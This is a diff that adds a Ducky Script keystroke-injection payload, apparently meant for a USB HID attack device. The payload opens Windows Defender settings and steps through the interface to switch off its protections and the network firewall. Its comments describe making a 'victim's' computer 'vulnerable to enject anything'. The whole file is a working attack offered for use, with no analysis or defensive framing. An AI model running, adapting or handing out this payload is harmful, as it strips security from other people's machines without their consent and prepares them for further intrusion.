@@ -1,0 +1,73 @@
+REM Author      : https://github.com/Alperencode
+DELAY 1000
+REM We're opening the Windows Defender settings
+CTRL ESC
+DELAY 250
+STRING Windows Defender Settings
+DELAY 100
+ENTER
+REM And disabling everything to make this computer vulnerable
+DELAY 500
+ENTER
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 2000
+ENTER
+DELAY 100
+SPACE
+DELAY 100
+TAB
+DELAY 100
+SPACE
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+SPACE
+REM Allright now its vulnerable to enject anything we want
+REM now we're gonna disable the firewall for networks
+DELAY 100
+LEFT
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+ENTER
+DELAY 100
+LEFT
+DELAY 100
+RIGHT
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+ENTER
+DELAY 100
+TAB
+DELAY 100
+SPACE
+REM and then closing everyting
+DELAY 100
+ALT F4
+DELAY 250
+ALT F4
+REM This program works in 6 seconds but if your victim's pc is slower then you may need to increase the delays
